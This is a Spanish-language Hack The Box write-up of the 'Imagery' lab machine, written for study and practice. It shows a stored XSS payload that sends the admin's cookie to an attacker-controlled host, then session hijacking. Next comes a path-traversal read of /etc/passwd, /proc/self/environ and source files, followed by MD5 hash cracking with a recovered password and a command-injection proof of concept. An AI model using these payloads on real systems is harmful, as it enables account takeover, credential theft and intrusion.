---
layout: single
title: Imagery - Hack The Box
excerpt: "Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador."
date: 2026-02-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-imagery/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - XSS
  - LFI
---

Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador. Por medio de la función de obtener los logs filtraremos in local file inclusion para obtener el código fuente de la aplicación donde finalmente haremos una inyección de comandos en la función que transforma o edita las imágenes.

# 1. Enumeración y Reconocimiento

Iniciamos con una fase de reconocimiento activo utilizando nmap para identificar la superficie de ataque. El objetivo es descubrir servicios en ejecución y versiones específicas que puedan presentar debilidades.

## 1.1 Escaneo de todos los puertos (Full Port Scan)
Ejecutamos un escaneo inicial sobre el rango completo de puertos TCP (1-65535) para asegurar que no pasamos por alto ningún servicio oculto en puertos no estándar.
```
nmap -p- -vvv --min-rate 5000 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:46 -05
Initiating Ping Scan at 14:46
Scanning 10.129.242.164 [2 ports]
Completed Ping Scan at 14:46, 0.32s elapsed (1 total hosts)
Initiating Connect Scan at 14:46
Scanning imagery.htb (10.129.242.164) [65535 ports]
Discovered open port 22/tcp on 10.129.242.164
Completed Connect Scan at 14:46, 26.62s elapsed (65535 total ports)
Nmap scan report for imagery.htb (10.129.242.164)
Host is up, received conn-refused (0.17s latency).
Scanned at 2026-02-19 14:46:05 -05 for 27s
Not shown: 65465 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack
8000/tcp  open   http-alt         syn-ack ttl 63
```
## 1.2 Detección de Servicios y Versiones
Una vez identificados los puertos abiertos, realizamos un escaneo más profundo utilizando los flags -sC (scripts por defecto) y -sV (detección de versiones).

```
nmap -p 22,8000 -sCV 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:53 -05
Nmap scan report for imagery.htb (10.129.242.164)
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```

## 1.3 Configuración del Virtual Host

Dado que el servidor web puede estar configurado para responder a un nombre de dominio específico, es necesario mapear la dirección IP de la instancia al nombre de dominio imagery.htb. Esto permite que el navegador (o herramientas como curl) envíe el encabezado HTTP Host correcto.

Modificamos el archivo `/etc/hosts` de nuestro sistema atacante:

```
echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
```

![](/assets/images/htb-writeup-imagery/home.png)

Al acceder a `http://imagery.htb:8000`, nos encontramos con una plataforma de gestión de imágenes. Para interactuar con las funciones internas de la aplicación, procedemos a crear una cuenta de usuario.

- **Registro**: Navegamos al endpoint `/register` para crear un nuevo perfil.
- **Autenticación**: Una vez registrados, iniciamos sesión en el panel de `/login`

# 2. Explotacion

## 2.1 Cross-Site Scripting (XSS) persistente

Durante la auditoría del panel de usuario, identificamos que el formulario en la ruta `/admin/bug_reports` no sanitiza correctamente la entrada del campo **Bug Details**. Al ser un reporte que será visualizado por un usuario con privilegios elevados (administrador), esto representa un vector de **Stored XSS**.

Para explotar esta vulnerabilidad y obtener la cookie de sesión del administrador, preparamos un servidor de escucha en nuestra máquina local:

```
python -m http.server 8080
```
Posteriormente, enviamos un reporte de error inyectando un payload diseñado para forzar al navegador de la víctima a redirigirse a nuestro servidor, adjuntando sus cookies en la URL:

**Payload inyectado**:

```html
<img src=/ onerror="document.location='http://{ip_atacante}:8080/'+document.cookie" />
```

Para automatizar o replicar esta acción, podemos interceptar la petición y utilizar el siguiente fetch desde la consola del navegador:

```js
await fetch("http://imagery.htb:8000/report_bug", {
    "method": "POST",
    "headers": {
        "Content-Type": "application/json"
    },
    "body": JSON.stringify({
        "bugName": "Critical UI Bug",
        "bugDetails": "<img src=/ onerror=\"document.location='http://10.10.15.107:8080/'+document.cookie\">"
    })
});
```

Una vez que el administrador accede al reporte para revisarlo, su navegador ejecuta el código malicioso. Recibimos la siguiente petición en nuestro servidor:

```
python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aZeEnw.GC9hjlqO-RnfgqivZOtmhF_yJKE HTTP/1.1" 404 -
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /favicon.ico HTTP/1.1" 404 -
```

Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y secuestro de sesión. 

Con esta cookie, procedemos a suplantar la identidad del administrador en el navegador para acceder a funciones restringidas. 

### 2.1.1 Secuestro de sesion
Con la cookie de sesión del administrador en nuestro poder, procedemos a realizar un **Session Hijacking**. Para ello, interceptamos la sesión actual en el navegador (vía DevTools > Storage) y sustituimos el valor de nuestra cookie `session` por el token capturado.

![](/assets/images/htb-writeup-imagery/secuestroSesion.png)

Tras refrescar la página, el servidor nos reconoce como el usuario `admin@imagery.htb`. Al explorar el panel administrativo, identificamos nuevas funcionalidades críticas:

- Gestión de usuarios (Eliminación).
- Visualización y borrado de reportes de errores.
- **Lectura de logs del sistema**.

Al analizar la petición encargada de obtener los registros del sistema, observamos un parámetro interesante:

```js
await fetch("http://imagery.htb:8000/admin/get_system_log?log_identifier=admin%40imagery.htb.log", {
    // ... headers ...
    "method": "GET"
});

```
## 2.2 Local File Inclusion (LFI)
Al analizar  el **Path** `/admin/get_system_log` y su **Query scrign** `?log_identifier=admin%40imagery.htb.log` notamos que el parámetro recibe el nombre de un log. En aplicaciones basadas en **Flask**, este comportamiento suele indicar que el backend utiliza una función de lectura de archivos para servir el contenido dinámicamente.

Si el servidor no sanitiza correctamente esta entrada (por ejemplo, mediante el uso de `os.path.join` sin validar secuencias de escape), estaríamos ante una vulnerabilidad de **Local File Inclusion (LFI)** o **Arbitrary File Read**.

Para confirmarlo, realizamos una fase de **Web Fuzzing** sobre el parámetro `log_identifier`. El objetivo es identificar si la aplicación permite el salto de directorios utilizando caracteres especiales (`../`).

### 2.2.1 Web Fuzzing con Burp Suite
Para validar el alcance del LFI, utilizamos el módulo **Intruder** de Burp Suite configurado en modo Sniper. Empleamos la wordlist [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), la cual contiene una amplia variedad de secuencias de salto de directorio y archivos conocidos de Linux.

Encontramos que podemos descargar y ver los directorios estandares del sistema.

- `/etc`: Confirmamos el Path Traversal al recuperar con éxito `/etc/grup`. Este archivo nos reveló la existencia de un usuario de sistema `web:x:1001:` (UID 1001), sugiriendo que la aplicación no corre bajo el contexto de `root`, sino de un usuario dedicado llamado **web**.
  - `/etc/passwd` 
  - `/etc/hosts`
  - `/etc/crontab`
  - `/etc/grup`

  ![](/assets/images/htb-writeup-imagery/lfi-etc.png)

- `/proc`: Es un archivo "virtual" que solo existe en la memoria mientras el sistema corre. Donde muestra las variables de entorno del proceso que se está ejecutando actualmente `HOME=/home/web` (el servidor de flask). 
  - `/proc/self/environ`

  ![](/assets/images/htb-writeup-imagery/lfi-proc.png)


### 2.2.2 Codigo fuente

Tras confirmar la ruta del usuario en las variables de entorno, procedemos a exfiltrar el archivo principal de la aplicación. En un entorno Flask, el archivo `app.py` suele actuar como el orquestador de la lógica del servidor.

Utilizamos `curl` para descargar el código, autenticándonos con la cookie de administrador secuestrada:

```
curl -s -O -b 'session={admin_cookie}'  http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
```

Se confirma que `SESSION_COOKIE_HTTPONLY` está explícitamente en False, lo que permitió nuestro ataque inicial de XSS

```py
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False
```

La aplicación importa módulos específicos para cada función. Basándonos en nuestra hoja de ruta inicial:

- config.py
- utils.py
- api_auth.py
- api_upload.py
- api_manage.py
- api_edit.py
- api_admin.py
- api_misc.py

Continuamos extrayendo archivos críticos definidos en los imports y en `config.py`:

```py
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'
```

`config.py` define `DATA_STORE_PATH = 'db.json'`. Al descargar este archivo, obtenemos los hashes de las contraseñas de los usuarios. Aunque ya tenemos acceso como administrador, vemos el hash del usuario **testuser@imagery.htb** podría ser util para persistencia o movimiento lateral (pudiendo ser crackeados con *John the Ripper* o *Hashcat*).

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ]
}
```

## 2.3 Remote Code Execution( RCE)

Analicemos el metodo `apply_visual_transform()` de  `api_edit.py`

```py
@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

```

Tras analizar el código fuente exfiltrado de `api_edit.py`, identificamos una vulnerabilidad crítica en el endpoint `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en db.json), un administrador puede interactuar con ella si la lógica de sesión lo permite o si se suplanta a dicho usuario.

Como vemos en el codigo fuente, este metodo tiene varias acciones para transformar una imagen: 
- `crop`: Recortar
- `rotate`: Girar / Rotar
- `saturation`: Saturacion
- `brightness`: Brillo
- `contrast`: Constraste

Analicemos la accion de recortar en el condicional.

```py
if transform_type == 'crop':
    x = str(params.get('x'))
    y = str(params.get('y'))
    width = str(params.get('width'))
    height = str(params.get('height'))
    command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
    subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

El desarrollador en este punto utiliza **ImageMagick** que es una suite de linea de comandos para procesar imagenes. Las variables `x`, `y`, `width` y `height` provienen directamente del input del usuario (`request.get_json()`) sin ningún tipo de saneamiento o validación numérica.

Al ejecutar `subprocess.run` con el argumento `shell=True`, Python invoca `/bin/sh` para interpretar la cadena command. Esto permite el uso de metacaracteres de shell (como `;`, `&&`, `|`) para encadenar comandos arbitrarios.

Para explotar esto, necesitamos que el parámetro `x` rompa la sintaxis del comando original, haciendo que la concatenacion referenciada en la variable `command` solo tome el valor de `x` para poder inyectar un comando del sistema operativo y hacernos con el servidor web via `rever shell`.

Mientras que las otras funciones (`rotate`, `saturation`, etc.) utilizan una lista de argumentos en `subprocess.run` (lo cual es seguro), la función `crop` usa una `f-string` vulnerable.

Ejemplo: mini PoC
```py
import subprocess

# Variables que no queremos que afecten
IMAGEMAGICK_CONVERT_PATH = "convert"
original_filepath = "imagen.jpg"
width, height, y = 100, 100, 0
output_filepath = "salida.jpg"

# El "inyector" en x:
# 1. El primer ';' termina el intento de 'convert'
# 2. 'ls -l' es lo que realmente se ejecutará
# 3. El '#' hace que '+{y} {output_filepath}' sea ignorado
x = "; ls -l #"

command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"

# IMPORTANTE: shell=True es obligatorio para que esto funcione
subprocess.run(command, shell=True)
```
En este script de python vemos que es posible romper la cadena y usar `x` como inyector.

### 2.3.1  Rompimiento de Hashes (Cracking)

Para explotar la inyección de comandos, la aplicación requiere que la sesión activa tenga el atributo `is_testuser_account` habilitado. Este flag se activa al autenticarse como el usuario **testuser@imagery.htb**.

Utilizamos los hashes MD5 obtenidos previamente del archivo `db.json` y procedemos a realizar un ataque de diccionario utilizando **Hashcat** y la wordlist `rockyou.txt`:

```
hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 -a 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt

2c65c8d7bfbca32a3ed42596192384f6:iambatman
```

- **Password**: iambatman

Con estas credenciales, cerramos la sesión de administrador e iniciamos sesión como **testuser**. Ahora, el servidor permitirá que nuestras peticiones al endpoint `/apply_visual_transform` procesen las transformaciones de imagen, desbloqueando nuestro vector de **RCE**.